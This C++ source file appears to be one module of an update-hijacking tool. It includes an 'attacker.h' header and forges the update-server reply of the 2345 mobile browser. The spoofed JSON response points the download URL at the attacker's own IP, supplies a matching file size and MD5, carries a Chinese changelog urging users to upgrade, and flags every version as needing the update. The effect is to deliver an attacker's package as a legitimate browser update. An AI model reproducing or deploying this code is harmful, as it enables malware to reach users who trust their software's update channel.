

#include "Browser2345.h"
#include <windows.h>
#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "../HttpUtils.h"


using namespace std;


Browser2345::Browser2345(unsigned long ulIP,string filepath,string filename){

	int ret = 0;
	int version = 256;
	
	string packagename = "com.androidmarket.dingzhi";
	string userversion = "1.9";
	char tmpappkey[64] = { 0 };
	memset(tmpappkey,32,' ');

	string szip = HttpUtils::getIPstr(ulIP) + "\\/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret == FALSE)
	{
		return;
	}

	char * lpRespFormat = 
		"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=gbk\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat=
		"{\"appkey\":\"%s\","
		"\"channel\":\"auto\","
		//"\"downurl\":\"http:\\/\\/%s\\/%s?%u\","			//download.app.2345.com\\/			
		"\"downurl\":\"http:\\/\\/%s\\/%s\","
		"\"packname\":\"%s\","
		"\"filename\":\"%s\","
		"\"filesize\":\"%u\","
		"\"md5\":\"%s\","
		"\"version\":\"%u\","
		"\"user_version\":\"%s\","
		"\"updatelog\":\"\\u5f3a\\u70c8\\u5efa\\u8bae\\u5347\\u7ea7\\u81f39.4.1\r\n1\\u3001\\u4fe1\\u606f\\u6d41\\u63a8\\u8350\\u4f18\\u5316\\uff0c\\u66f4\\u61c2\\u4f60\\uff0c\\u66f4\\u6709\\u8da3\r\n2\\u3001\\u5c0f\\u8bf4\\u9891\\u9053\\u4f18\\u5316\r\n2\\u3001\\u5176\\u4ed6\\u6027\\u80fd\\u4f18\\u5316\\u53cabug\\u5904\\u7406\","
		"\"updatetype\":\"update\","
		"\"need_update\":\"0,1,2,3,4,5,6,7,8,9\"}";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent,MAX_RESPONSE_HEADER_SIZE,lpRespContentFormat,
		tmpappkey, szip.c_str(), filename.c_str(),
		//version,
		packagename.c_str(),filename.c_str(), m_filesize, m_szmd5,version,userversion.c_str());

	m_iRespSize = sprintf_s(m_lpResp,MAX_RESPONSE_HEADER_SIZE,lpRespFormat,iRespContentLen,lpRespContent);
	return;

}



